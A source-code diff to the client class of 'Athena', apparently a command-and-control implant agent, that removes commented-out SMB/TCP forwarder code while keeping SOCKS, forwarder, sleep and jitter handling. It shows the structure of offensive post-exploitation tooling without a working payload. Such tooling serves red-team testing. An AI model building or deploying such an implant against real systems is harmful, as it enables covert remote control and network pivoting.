@@ -22,7 +22,6 @@ namespace Athena
     public class AthenaClient
     {
         public IProfile profile { get; set; }
-        //public IForwarder forwarder { get; set; }
         public CommandHandler commandHandler { get; set; }
         public SocksHandler socksHandler { get; set; }
         public ForwarderHandler forwarderHandler { get; set; }
@@ -33,16 +32,13 @@ namespace Athena
         {
             this.exit = false;
             this.availableProfiles = GetProfiles();
-            //this.availableForwarders = GetForwarders();
             this.profile = SelectProfile(0);
-            //this.forwarder = SelectForwarder(0);
             this.socksHandler = new SocksHandler();
             this.commandHandler = new CommandHandler();
             this.forwarderHandler = new ForwarderHandler();
             this.commandHandler.SetSleepAndJitter += SetSleepAndJitter;
             this.commandHandler.StartForwarder += StartForwarder;
             this.commandHandler.StopForwarder += StopForwarder;
-            //this.commandHandler.SetForwarder += SetForwarder;
             this.commandHandler.StartSocks += StartSocks;
             this.commandHandler.StopSocks += StopSocks;
             this.commandHandler.ExitRequested += ExitRequested;
@@ -57,14 +53,6 @@ namespace Athena
         {
             return this.availableProfiles[choice];
         }
-        /// <summary>
-        /// Select the initial SMB Forwarder
-        /// </summary>
-        /// <param name="choice">The forwarder to switch to, if null a random one will be selected</param>
-        //private IForwarder SelectForwarder(int choice)
-        //{
-        //    return this.availableForwarders[choice];
-        //}
 
         /// <summary>
         /// Get available C2 Profile Configurations
@@ -133,51 +121,6 @@ profiles.Add("Athena.Profiles.SMB");
 #endif
             return configs;
         }
-        /// <summary>
-        /// Get available forwarder Configurations
-        /// </summary>
-//        private List<IForwarder> GetForwarders()
-//        {
-//            List<string> profiles = new List<string>();
-//            List<IForwarder> forwarders = new List<IForwarder>();
-//#if SMBFWD || DEBUG
-//            profiles.Add("Athena.Forwarders.SMB");
-//#elif TCPFWD
-//            profiles.Add("Athena.Forwarders.TCP");
-//#else
-//            profiles.Add("Athena.Forwarders.Empty");
-//#endif
-
-//#if NATIVEAOT
-//            forwarders.Add(profiles.FirstOrDefault().ToUpper(), new Forwarder());
-//#else
-//            foreach (var profile in profiles)
-//            {
-//                try
-//                {
-//                    Assembly fwdAsm = Assembly.Load($"{profile}, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null");
-
-//                    if (fwdAsm == null)
-//                    {
-//                        continue;
-//                    }
-//                    foreach (Type t in fwdAsm.GetTypes())
-//                    {
-//                        if (typeof(IForwarder).IsAssignableFrom(t))
-//                        {
-//                            Debug.WriteLine($"[{DateTime.Now}] Adding Forwarder: {profile}");
-//                            forwarders.Add((IForwarder)Activator.CreateInstance(t));
-//                        }
-//                    }
-//                }
-//                catch
-//                {
-//                    Debug.WriteLine($"[{DateTime.Now}] Failed to load assembly for {profile}, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null");
-//                }
-//            }
-//#endif
-//            return forwarders;
-//        }
 
         #region Communication Functions      
         /// <summary>
@@ -498,7 +441,7 @@ profiles.Add("Athena.Profiles.SMB");
                 }
                 return true;
             }
-            catch (Exception e)
+            catch
             {
                 return false;
             }
